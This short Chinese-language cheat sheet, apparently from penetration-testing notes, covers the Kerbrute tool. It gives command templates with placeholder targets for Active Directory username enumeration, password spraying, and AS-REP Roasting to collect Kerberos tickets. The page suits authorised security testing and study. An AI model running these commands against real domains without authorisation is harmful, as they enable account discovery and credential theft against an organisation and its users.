---
description: 域用户名枚举 / 密码喷洒 / 获取AS-REP票据 (AS-REP Roasting) -> 识别潜在用户名和密码
---

# ✔️ Kerbrute

## 枚举域内有效用户名

* `usernames.txt`：可以是字典文件，也可以是自己针对目标域收集到的可能的用户名列表

```bash
kerbrute userenum -d 目标域名 usernames.txt -dc-ip 域控IP
```

## 密码喷洒

* `passwordspray`：指定操作为密码喷射

```bash
kerbrute passwordspray -d 目标域名 -p 已知的密码 usernames.txt -dc-ip 域控IP
```

## AS-REP Roasting

* 获取 Kerberos 预身份验证数据（AS-REP 票据）
* `asreproast`：指定操作为 AS-REP Roasting

```bash
kerbrute asreproast -d 目标域名 usernames.txt -dc-ip 域控IP
```
